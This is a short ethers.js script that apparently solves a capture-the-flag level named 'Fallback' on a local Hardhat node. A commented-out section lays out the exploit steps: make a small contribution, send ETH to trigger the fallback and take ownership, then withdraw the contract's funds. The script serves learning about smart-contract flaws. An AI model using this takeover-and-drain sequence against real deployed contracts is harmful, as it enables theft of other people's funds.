import { ethers } from "ethers";

export default async function (contractAddress) {

  // Connect to local Hardhat node
  const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

  // Get the first account as signer
  const accounts = await provider.listAccounts();
  const signer = await provider.getSigner(1);

  console.log(signer.address);

  // Create a contract instance
  const Fallback = new ethers.Contract(
    contractAddress,
    [
      "function contribute() external payable",
      "function withdraw() external",
      "function owner() public view returns (address)"
    ],
    provider
  );

  // Example: read owner
  const owner = await Fallback.owner();
  console.log("Owner:", owner);

  /*
  const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

  const signer = await provider.getSigner(19);

  const Fallback = new ethers.Contract(contractAddress, [
    "function contribute() external payable",
    "function withdraw() external",
    "function owner() view returns (address)"
  ], signer);
  */

  /*
  // Fetch deployed bytecode
  const bytecode = await provider.getCode(contractAddress);

  console.log("Deployed bytecode at address", contractAddress, ":\n");
  console.log(bytecode);

  if (bytecode === "0x") {
    console.log("\n⚠️ No contract found at this address. Maybe it’s not deployed on this network.");
  }
  */

  /*
  console.log("Current contract owner address:", await Fallback.owner());

  const attackerAddress = signer.address;
  console.log("Attacker address:", attackerAddress);

  // Step 1: Contribute
  await (await Fallback.contribute({ value: ethers.parseEther("0.0001") })).wait();

  // Step 2: Send ETH to trigger fallback
  await (await signer.sendTransaction({ to: contractAddress, value: ethers.parseEther("0.0001") })).wait();

  // Step 3: Check owner
  console.log("New owner:", await Fallback.owner());

  // Step 4: Withdraw
  await (await Fallback.withdraw()).wait();

  console.log("Exploit complete!");
  */
}

